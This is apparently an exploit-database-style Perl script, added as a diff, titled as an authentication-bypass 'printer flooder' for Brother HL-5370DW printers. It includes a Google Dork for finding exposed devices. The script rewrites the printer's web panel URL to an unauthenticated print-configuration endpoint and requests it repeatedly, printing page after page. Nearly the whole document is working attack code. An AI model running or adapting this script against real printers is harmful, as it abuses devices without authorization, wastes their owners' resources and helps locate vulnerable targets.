@@ -1,0 +1,41 @@
+# Exploit Title: Brother HL-5370DW series auth bypass printer flooder
+# Google Dork: Copyright(C) 2000-2009 Brother Industries, Ltd. All Rights Reserved. Brother HL-5370DW series
+# Date: 31/05/2011
+# Author: chrisB
+# Contact : chrisb [@) gmx.fr
+# Version: Brother HL-5370DW series
+
+#!/usr/bin/perl
+use LWP::Simple;
+
+usage() unless $ARGV[1];
+
+$replace = 'post/panel.html?EXECUTE2=PRTCONFIG';
+$hint = $ARGV[1];
+$goodurl = $ARGV[0];
+$success = 0;
+$goodurl =~ s/main.html/$replace/; 
+
+ for ($count = $hint + 1; $count >= 1; $count--) {
+ 		$contents = get($goodurl);
+
+	if($contents =~ m/acknowledged/i) 
+	{
+		$success++;
+		print "success\n";
+	} 
+	else 
+	{
+		print "error, busy or no more paper\n";
+	}
+ }
+ print "pages printed : $success \r\n"; 
+	
+sub usage 
+{
+ print qq( Brother HL-5370DW series auth bypass printer flooder
+       
+Usage: perl $0 [http://url.fr/printer/main.html] [hints]
+                  
+)   and exit;
+}
